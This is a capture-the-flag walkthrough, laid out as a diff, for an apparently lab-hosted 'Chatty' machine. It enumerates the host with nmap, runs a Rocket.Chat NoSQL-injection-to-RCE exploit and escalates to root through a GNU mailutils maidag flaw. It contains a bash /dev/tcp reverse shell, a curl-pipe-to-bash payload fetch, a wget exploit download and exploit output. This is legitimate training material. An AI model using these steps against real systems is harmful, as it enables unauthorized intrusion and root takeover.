@@ -1,0 +1,137 @@
+																							               Chatty Walkthrough
+																										
+Attacker's Machine: 192.168.49.68
+Victim's Machine: 192.168.68.164
+export IP=192.168.68.164
+	
+nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s
+
+22/tcp   open  ssh
+3000/tcp open  ppp
+
+nmap -Pn -n -sC -sV -p22,3000 $IP --open --stats-every=5s -oN results.txt
+
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+3000/tcp open  ppp?
+
+nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000
+ <!-- nothing -->
+ 
+Port 3000 Enumeration
+wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 --hh 224502 -t 30 "http://$IP:3000/FUZZ/"
+
+searchsploit rocket.chat
+
+Rocket.Chat 3.12.1 - NoSQL Injection (Unauthenticated)                                                                            | linux/webapps/49960.py
+Rocket.Chat 3.12.1 - NoSQL Injection to RCE (Unauthenticated) (2)                                                            | linux/webapps/50108.py
+
+searchsploit -m linux/webapps/50108.py
+
+# Since the scripts is using some libraries that we might be missing, we might need to install oathtool
+
+pip3 install oathtool
+
+#This script attempts to gain access to a low privilege account before using that account to gain access to an admin account. 
+  We need an email for a low privilege user and the admin user. Since we can register new accounts but we don't have an admin account, we will have to remove some parts of the code for the script to work.
+  Comment all codes between the lines 163 and 171 from the script.
+  
+# Getting Low Priv user
+#print(f"[+] Resetting {lowprivmail} password")
+## Sending Reset Mail
+#forgotpassword(lowprivmail,target)
+
+## Getting reset token through blind nosql injection
+#token = resettoken(target)
+
+## Changing Password
+#changingpassword(target,token)
+
+# Now create a new user using the register functionality, but make sure you set the same password that is used within the script. The password is P@$$w0rd!1234
+
+New user
+username: urs
+password: P@$$w0rd!1234
+email: urs@gmail.com
+
+# After you log in with your new user, you go to General channel and you notice that you have a message from the admin@chatty.offsec
+   Now that we have pretty much everything we need, let's try to use our exploit.
+   
+python3 50108.py -u "urs@gmail.com" -a "admin@chatty.offsec" -t "http://192.168.68.164:3000" 
+
+[+] Resetting urs@gmail.com password
+[+] Succesfully authenticated as urs@gmail.com
+Got the code for 2fa: GJLFCKKOOBCVOYSCOJYHCUZ7NAUSUMKYEZAF43RVJ5KC62JYGVYA
+[+] Resetting admin@chatty.offsec password
+[+] Password Reset Email Sent
+[+] Succesfully authenticated as urs@gmail.com
+Got the reset token: 4nUJ9s6HBgS56PD0mykshohsSxqC39CR-RVvNrgvVaJ
+[+] Admin password changed !
+CMD:> id
+[+] Succesfully authenticated as administrator
+{"success":false}
+
+# We now have the ability to execute commands on the target system, but we can't see their output. We can use this to establish a reverse shell.
+    Aparently we cannot get a shell directly, we need to run a bash script that will run the command bash -c 'bash -i >& /dev/tcp/192.168.49.68/4444 0>&1'
+    
+# Create a bash script which will make us get our shell
+
+   nano shell.sh
+   bash -c 'bash -i >& /dev/tcp/192.168.49.68/4444 0>&1'
+   
+# Create a python server from where we can retrieve our bash file and run it directly with bash
+
+   python3 -m http.server
+   
+# Grab the file and run it in bash directoy from the command line that we have on the victim's machine.   
+
+CMD:> curl http://192.168.49.68:8000/shell.sh | bash   
+
+# Switch back to our netcat listener, you should get shell
+
+cd /home/rocketchat/local.txt              # Flag: ff8569f56d6d7e955eebeaecbbd59b0f
+
+
+Privilege escalation
+
+find / -perm -u=s -type f 2>/dev/null
+
+/usr/local/sbin/maidag
+
+# Maidag is a mail delivery agent and a part of GNU mailutils. We can check what version we are working with by passing it the --version flag.
+
+/usr/local/sbin/maidag --version          # 3.7
+
+# Search online for exploits for maidag 3.7 
+
+https://github.com/bcoles/local-exploits/blob/master/CVE-2019-18862/exploit.ldpreload.sh
+
+# This script will compile a couple of simple binaries that when executed by root, will create a sh binary for us in /var/tmp with SUID set. The exploit will use maidag to write to /etc/ld.so.preload, and then we must cause a privileged execution to run our additions to ls.so.preload. The script will attempt to spam TCP connections to Postfix to accomplish this. However, We don't have Postfix running on this target, so this probably won't cause a privileged execution. The second sentence above, however, indicates that SSH (another network service) may be usable for the same effect.
+
+# Go to a world writable directory and copy the exploit there
+
+  cd /dev/shm
+  wget http://192.168.49.68:8000/maidag3.7_ldpreload.sh
+  chmod +x maidag3.7_ldpreload.sh
+  ./maidag3.7_ldpreload.sh                               # run the exploit
+
+#  If we check the contents of /var/tmp now, we will find a new sh binary, but it's owned by rocketchat and doesn't have SUID.
+
+  ls -al /var/tmp/sh  
+  -rwxr-xr-x 1 rocketchat rocketchat 16792 Apr  2 21:06 /var/tmp/sh
+  
+# Let's attempt to cause a privileged execution by trying to SSH to the target as rocketchat. Even if we don't have the password, once we try to log in, the exploit will run
+
+  ssh rocketchat@$IP
+  
+# Use 3 times the wrong password
+# Let's check on our new sh binary in /var/tmp again.
+    ls -al /var/tmp/sh  
+   -rwsr-xr-x 1 root root 16792 Apr  2 21:06 /var/tmp/sh
+   
+# Now just run the /var/tmp/sh script to obtain shell.
+
+   ./sh
+   id
+   uid=0(root) gid=0(root) groups=0(root),1000(rocketchat)
+   cd /root
+   cat proof.txt                                      # Flag:   64658f42f3b2cec12985c7dcc9b936eb
